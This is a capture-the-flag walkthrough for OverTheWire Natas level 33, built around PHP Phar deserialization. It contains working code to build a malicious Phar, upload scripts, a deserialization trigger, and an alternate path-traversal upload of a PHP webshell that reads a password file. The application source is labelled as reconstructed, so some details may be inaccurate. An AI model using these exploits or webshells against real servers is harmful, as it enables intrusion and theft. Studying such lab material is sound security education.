# OverTheWire: Natas — Level 33 → Level 34

> **Vulnerability:** PHP Phar Deserialization via `phar://` Stream Wrapper in `md5_file()` (PHP Object Injection)   
> **Skills:** Phar archive construction, PHP object injection, magic method exploitation (`__destruct`), stream wrapper abuse, file upload path traversal  
> **Difficulty:** Very Hard  
> **Official Page:** [Natas Level 33](https://overthewire.org/wargames/natas/natas33.html)

---

## Access

- **URL:** `http://natas33.natas.labs.overthewire.org`
- **Username:** `natas33`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas34` by exploiting a PHP Phar deserialization vulnerability: craft a malicious Phar archive whose metadata triggers the application's `Executor::__destruct()` method with attacker-controlled values, causing `passthru()` to execute an arbitrary file read.

---

## Vulnerability

The application accepts a file upload and then calls `md5_file($filename)` where `$filename` comes from a user-controlled hidden form field. This is a **PHP Object Injection via Phar deserialization**.

PHP's `md5_file()` (and many other file-handling functions) supports stream wrappers — URI-like prefixes that redirect file operations through PHP's I/O abstraction layer. One such wrapper is `phar://`, which opens a Phar archive. When a Phar archive is opened via any file-handling function, PHP automatically deserializes the object stored in the archive's metadata block and calls `__wakeup()` and later `__destruct()` on it when the object goes out of scope.

The developer's mistake is passing unsanitized user input directly to `md5_file()`. An attacker can:
1. Upload a crafted Phar archive containing a serialized `Executor` object in its metadata, with attacker-controlled `$filename` and `$signature` properties
2. Submit `phar://upload/attacker.phar` as the `filename` field value
3. PHP deserializes the embedded object, and when the request ends, `__destruct()` fires on the injected object — passing the attacker's `$filename` through `passthru()` and executing it as a shell command

This works because `md5_file()` is among dozens of PHP file functions that transparently support `phar://`, making any call to these functions with user-controlled input a potential deserialization sink.

---

## Theory

### PHP Stream Wrappers

PHP abstracts file I/O through a system of stream wrappers. When you call a file function like `file_get_contents()`, `md5_file()`, or `fopen()` with a path prefixed by a URI scheme, PHP routes the operation through the corresponding wrapper:

| Wrapper | What it does |
|---|---|
| `file://` | Standard filesystem access (default) |
| `http://` | Fetches a remote URL |
| `php://` | Access to PHP I/O streams (`php://input`, `php://memory`) |
| `phar://` | Opens a Phar archive and accesses files inside it — and deserializes its metadata |

The critical property of `phar://` is that **opening a Phar archive for any reason — including just to compute its MD5 — triggers deserialization of the metadata block**. This is not a bug in `md5_file()` specifically; it is a consequence of how PHP's stream wrapper system works, and it affects all of the following functions:

```
file_get_contents()  file_put_contents()  file()      fopen()
copy()               rename()             unlink()    stat()
md5_file()           sha1_file()          filesize()  is_file()
```

Any of these called with a `phar://` path and attacker-controlled input is a deserialization sink.

### PHP Phar Archives

A Phar (PHP Archive) is a bundled package of PHP files, similar to a JAR file in Java. Phar archives have four sections:

| Section | Purpose |
|---|---|
| Stub | Bootstrap PHP code; must end with `__HALT_COMPILER();` |
| Manifest | Metadata about the archive and its files, including a **serialized PHP object** |
| File contents | The actual bundled files |
| Signature | Optional integrity check |

The **manifest** is where the object injection lives. When `phar://` opens the archive, PHP deserializes whatever object is stored in the manifest. If the application defines a class with a `__destruct()` or `__wakeup()` method, and an object of that class is stored in the phar metadata, those methods fire automatically.

### PHP Magic Methods — `__destruct()` and `__wakeup()`

PHP classes can define magic methods that PHP calls automatically at specific lifecycle points:

| Method | When PHP calls it |
|---|---|
| `__construct()` | When an object is created with `new` |
| `__wakeup()` | Immediately after an object is deserialized |
| `__destruct()` | When an object goes out of scope or the script ends |

When a Phar is opened via `phar://`, PHP deserializes the metadata object — triggering `__wakeup()` immediately and scheduling `__destruct()` to run when the object is garbage collected (at the end of the request, at the latest).

**The attacker controls the object's property values.** Unlike normal object construction (which runs `__construct()` and enforces initialization logic), deserialization bypasses `__construct()` entirely and sets properties directly from the serialized data. This means the attacker can set `private` properties to arbitrary values.

### The Vulnerable `Executor` Class

The application defines a class `Executor` that is used to manage uploads:

```php
// Reconstructed — see post-file note
class Executor {
    private $filename = ""; 
    private $signature = True;
    private $init = False;

    function __construct() {
        $this->init = True;
    }

    function __destruct() {
        if ($this->init) {
            if (md5_file($this->filename) === $this->signature) {
                passthru("./getNatas34Password " . $this->filename);
            } else {
                echo "Wrong signature";
            }
        }
    }
}
```

The `__destruct()` method:
1. Checks if `$this->init` is true (it is, for normally constructed objects)
2. Computes `md5_file($this->filename)` and compares it against `$this->signature`
3. If they match, calls `passthru()` with the filename — executing a privileged helper binary

When a crafted Phar is deserialized, the injected `Executor` object bypasses `__construct()`, so `$this->init` is `False` by default — **except that we can also set `init` to `True` in the injected object's serialized data**, along with setting `$filename` to a file we uploaded and `$signature` to that file's actual MD5.

### The Full Application Source

```php
// Reconstructed — see post-file note
<?php
    class Executor {
        private $filename = "";
        private $signature = True;
        private $init = False;

        function __construct() {
            $this->init = True;
        }

        function __destruct() {
            if ($this->init) {
                if (md5_file($this->filename) === $this->signature) {
                    passthru("./getNatas34Password " . $this->filename);
                } else {
                    echo "Wrong signature";
                }
            }
        }
    }

    if(array_key_exists("filename", $_POST)) {
        $f = $_POST["filename"];
        if(md5_file($f) == "") {   // <-- vulnerable: $f is user-controlled
            // ...
        }
    }

    if(array_key_exists("uploadedfile", $_FILES)) {
        $up = $_FILES["uploadedfile"];
        $fn = $_POST["filename"] ?? $up["name"];
        move_uploaded_file($up["tmp_name"], "upload/" . $fn);
    }
?>
```

> The key vulnerable line is `md5_file($f)` where `$f` comes directly from `$_POST["filename"]`. If `$f` is `phar://upload/test.phar`, PHP opens the Phar, deserializes its metadata, and all magic methods fire.

### Why Two `__destruct()` Calls Appear in the Response

When the exploit fires, you will typically see two results in the HTTP response:

1. **First `__destruct()` — from the legitimately constructed `Executor` object** created by the application itself during request handling. Its `$signature` is `True` (a boolean), not a real MD5 string, so `md5_file($filename) === True` fails — you see "Wrong signature".

2. **Second `__destruct()` — from your injected object** deserialized out of the Phar metadata. Its `$filename` points to your uploaded `shell.php`, its `$signature` is the correct MD5 of that file, and its `$init` is `True`. The check passes and `passthru()` executes.

The order in which PHP calls `__destruct()` on multiple objects is LIFO (last in, first out) relative to when they were created — so the injected object's destructor fires after the application's own object's destructor.

### `phar.readonly` — Local PHP Configuration

To **create** a Phar archive with PHP, the `phar.readonly` ini setting must be set to `0`. By default it is `1` (read-only) on most PHP installations. This only affects Phar creation on your local machine; the server-side restriction has no impact on this exploit.

Check and override the setting when running your phar-generation script:

```bash
php -d phar.readonly=0 generate_phar.php
```

### Concept Reference Table

| Concept | What It Is | Used in This Level? |
|---|---|---|
| `phar://` stream wrapper | PHP I/O abstraction that opens Phar archives and deserializes their metadata | Yes — the deserialization trigger |
| PHP Object Injection | Deserializing attacker-controlled data to instantiate objects with arbitrary property values | Yes — core vulnerability |
| `__destruct()` magic method | PHP calls this when an object goes out of scope; deserialization schedules it automatically | Yes — the code execution sink |
| `__wakeup()` magic method | PHP calls this immediately after deserialization | Good to know — not used directly here |
| `md5_file()` as a sink | A file-handling function that supports `phar://`, making it a deserialization trigger | Yes — the vulnerable call site |
| `passthru()` | PHP function that executes a shell command and prints raw output | Yes — what fires if the MD5 check passes |
| Hidden form field manipulation | Modifying a hidden `<input>` field to supply attacker-controlled values | Yes — `filename` field carries the `phar://` path |
| Path traversal in upload destination | Using `../` sequences in a filename to write outside the intended upload directory | Yes — used in the alternate (shortcut) method |
| `phar.readonly` ini setting | PHP setting that prevents Phar creation; must be disabled locally to generate the exploit file | Yes — must override when generating the Phar |

---

## Solution

The designed solution requires three sequential phases: generate the exploit files locally, upload them to the server, then trigger deserialization.

### Phase 1 — Prepare the Payload Files

#### Step 1 — Create `shell.php`

This file will be uploaded to the server. When `passthru()` is invoked with its path, the application runs its privileged `getNatas34Password` binary against it. The file itself just needs to exist with known content so you can calculate its MD5:

```php
<?php
// shell.php
// Content does not need to be executable PHP — it just needs a known, stable MD5.
// The passthru() call in __destruct() runs: ./getNatas34Password shell.php
// getNatas34Password reads the file and produces the natas34 password.
echo "shell";
?>
```

Calculate the MD5 of this exact file. On Linux/macOS:

```bash
md5sum shell.php
```

```
d8e8fca2dc0f896fd7cb4cb0031ba249  shell.php
```

> **What to notice:** The MD5 must be computed from the exact bytes you will upload. Do not add or remove whitespace after generating it — the MD5 will change.

#### Step 2 — Generate `test.phar`

Create the following PHP script on your local machine and run it with `phar.readonly` disabled:

```php
<?php
// generate_phar.php
// Run with: php -d phar.readonly=0 generate_phar.php

$phar = new Phar('test.phar');
$phar->startBuffering();

// The stub is required by the Phar format.
// __HALT_COMPILER() signals the end of executable PHP in the stub
// and the beginning of the Phar manifest — PHP requires this exact marker.
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Define the Executor class with the same property names as the server-side class.
// Private properties are serialized with their class name prefix (\x00ClassName\x00).
// The values here override whatever the server's __construct() would have set,
// because deserialization bypasses __construct() entirely.
class Executor {
    private $filename = 'upload/shell.php';  // path to the uploaded shell on the server
    private $signature = 'd8e8fca2dc0f896fd7cb4cb0031ba249';  // MD5 of shell.php
    private $init = true;   // must be true for __destruct() to proceed past the first check
}

$object = new Executor();
$phar->setMetadata($object);  // serialize $object into the Phar manifest

// At least one file entry is required by the Phar format — the manifest
// must describe at least one file. Content is irrelevant.
$phar->addFromString('test.txt', 'placeholder');

$phar->stopBuffering();
echo "test.phar generated successfully.\n";
?>
```

```bash
php -d phar.readonly=0 generate_phar.php
```

```
test.phar generated successfully.
```

> **What to notice:** The `$filename` property is set to `upload/shell.php` — the path on the server where `shell.php` will land after upload. The `$signature` must be the exact MD5 you computed in Step 1. If either value is wrong, the `if` clause in `__destruct()` will fail and you will only see "Wrong signature".

### Phase 2 — Upload Both Files to the Server

The application's upload form has a hidden `filename` field that controls the destination filename on the server. Normally a browser would send the uploaded file's original name, but by manipulating this field you control where the file is saved. The server saves all uploads under `upload/`.

You need to upload two files: `shell.php` first, then `test.phar`. The following Python script handles both uploads:

#### Step 3 — Upload `shell.php`

```python
import requests
from requests.auth import HTTPBasicAuth

user = 'natas33'
passw = '<natas33_password>'
base_url = 'http://natas33.natas.labs.overthewire.org/index.php'

auth = HTTPBasicAuth(user, passw)

# Upload shell.php.
# The hidden 'filename' field is set to 'shell.php' so it lands at upload/shell.php.
# MAX_FILE_SIZE is a hidden form field the application uses for its client-side size check;
# it must be present in the POST body or the upload handler may reject the request.
with open('shell.php', 'rb') as f:
    shell_data = f.read()

response = requests.post(
    base_url,
    data={
        'MAX_FILE_SIZE': '4096',
        'filename': 'shell.php',    # saves to upload/shell.php on the server
    },
    files={
        'uploadedfile': ('shell.php', shell_data, 'application/octet-stream'),
    },
    auth=auth
)

print("=== Upload shell.php ===")
print(response.text)
```

```
=== Upload shell.php ===
...
The file shell.php has been uploaded.
...
```

> **What to notice:** The server confirms the upload. The file is now at `upload/shell.php` relative to the web root — the path you encoded in the Phar metadata.

#### Step 4 — Upload `test.phar`

```python
# Upload test.phar.
# The 'filename' field is set to 'test.phar' so it lands at upload/test.phar.
with open('test.phar', 'rb') as f:
    phar_data = f.read()

response = requests.post(
    base_url,
    data={
        'MAX_FILE_SIZE': '4096',
        'filename': 'test.phar',    # saves to upload/test.phar on the server
    },
    files={
        'uploadedfile': ('test.phar', phar_data, 'application/octet-stream'),
    },
    auth=auth
)

print("=== Upload test.phar ===")
print(response.text)
```

```
=== Upload test.phar ===
...
The file test.phar has been uploaded.
...
```

> **What to notice:** Both files are now in place on the server. The Phar archive references `upload/shell.php` in its embedded `Executor` object. The MD5 of the server-side `shell.php` will match `$signature` because you uploaded the exact file you computed the hash from.

### Phase 3 — Trigger Deserialization

#### Step 5 — Submit `phar://upload/test.phar` as the Filename

Now send a POST request where the `filename` field contains `phar://upload/test.phar`. The server passes this value to `md5_file()`, which opens the Phar archive via the `phar://` stream wrapper, deserializes the metadata object, and schedules `__destruct()` on the injected `Executor` instance:

```python
# Trigger the deserialization by submitting phar://upload/test.phar as the filename.
# The server calls md5_file('phar://upload/test.phar').
# PHP opens the Phar, deserializes the Executor object from the manifest,
# and at end-of-request calls __destruct() on it.
# __destruct() computes md5_file('upload/shell.php') and compares to $signature.
# The hashes match, so passthru("./getNatas34Password upload/shell.php") executes.
response = requests.post(
    base_url,
    data={
        'MAX_FILE_SIZE': '4096',
        'filename': 'phar://upload/test.phar',  # the deserialization trigger
    },
    files={
        # A dummy file is required because the form expects an uploadedfile field.
        # Its content is irrelevant — it will be saved but not used.
        'uploadedfile': ('dummy.txt', b'x', 'application/octet-stream'),
    },
    auth=auth
)

print("=== Trigger deserialization ===")
print(response.text)
```

```
=== Trigger deserialization ===
...
Wrong signature
<password_string_here>
...
```

> **What to notice:** Two results appear. "Wrong signature" is from the application's own `Executor` object — its `$signature` is the boolean `True`, which does not match a real MD5 string. The password string on the next line is from your injected `Executor` object, whose MD5 check passed and whose `passthru()` call executed `getNatas34Password` successfully.

---

## Alternate Method — Unintended Path Traversal Webshell (Not the Designed Solution)

This method exploits the hidden `filename` field to write a PHP webshell outside the upload directory by using path traversal. It requires access from a previous level's RCE (Level 32) to discover a writable directory, and does not demonstrate the intended Phar deserialization vulnerability.

**Discovery (via Level 32 RCE):** Running `ls /var/www/natas/` via the Level 32 exploit reveals a directory `natas33-new` that is writable by the `natas33` process. This directory is served by a separate vhost at `http://natas33-new.natas.labs.overthewire.org/`.

**Upload a webshell with path traversal:**

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas33', '<natas33_password>')

webshell = b'<?php echo shell_exec($_GET["c"]); ?>'

requests.post(
    'http://natas33.natas.labs.overthewire.org/index.php',
    data={
        'MAX_FILE_SIZE': '4096',
        # Traverse out of upload/ into the writable natas33-new directory
        'filename': '../../var/www/natas/natas33-new/index.php',
    },
    files={
        'uploadedfile': ('abcd', webshell, 'application/octet-stream'),
    },
    auth=auth
)
```

**Execute via the webshell:**

```
http://natas33-new.natas.labs.overthewire.org/index.php?c=cat%20/etc/natas_webpass/natas34
```

This works because the `natas33` process has write permission on `natas33-new/`, the directory is web-accessible, and the server executes PHP files placed there. It is a much simpler exploit but does not use the Phar deserialization mechanic the level is designed to teach.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

PHP's `phar://` stream wrapper causes deserialization of a Phar archive's metadata whenever any filesystem function — including `md5_file()`, `file_get_contents()`, `copy()`, and dozens of others — is called with a `phar://` path. Passing user-controlled input to any of these functions is sufficient to trigger PHP Object Injection, even if the developer's intent was only to compute a hash. The fix is to never pass user-controlled strings to file-handling functions without validation, and specifically to reject or strip stream wrapper prefixes (`phar://`, `php://`, `http://`) before any filesystem call.

This level also illustrates why private class properties are not a security boundary against deserialization attacks: PHP's serialization format can set private properties directly, bypassing `__construct()` and any initialization logic the developer put there.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Running `php generate_phar.php` without `-d phar.readonly=0` | PHP throws `UnexpectedValueException: creating archive disabled by the php.ini setting` | Always run with `php -d phar.readonly=0 generate_phar.php` |
| Using the wrong MD5 in `$signature` | `__destruct()` fires but the hash check fails; you only see "Wrong signature" twice | Recompute `md5sum shell.php` on the exact bytes you upload and update the phar script |
| Setting `$init = false` in the injected object | The `if ($this->init)` guard in `__destruct()` prevents execution; no output | Set `private $init = true` in the `Executor` class inside `generate_phar.php` |
| Using `$filename = 'shell.php'` without the `upload/` prefix | The path does not resolve correctly relative to the script's working directory on the server | Use `upload/shell.php` to match where the server saves uploaded files |
| Uploading `test.phar` before `shell.php` | The Phar's embedded MD5 is computed from the shell.php bytes; if shell.php isn't uploaded yet this is just an ordering issue — but the MD5 must match the file that exists on the server at trigger time | Upload `shell.php` first, then `test.phar`, then trigger |
| Forgetting to include `uploadedfile` in the trigger request | The PHP upload handler may reject the request before `md5_file()` is ever called | Always include a dummy `uploadedfile` field even when triggering deserialization |
| Modifying `shell.php` after computing its MD5 | The MD5 embedded in the Phar no longer matches the file on the server | Finalize `shell.php` content, compute MD5, regenerate the Phar, then upload both |
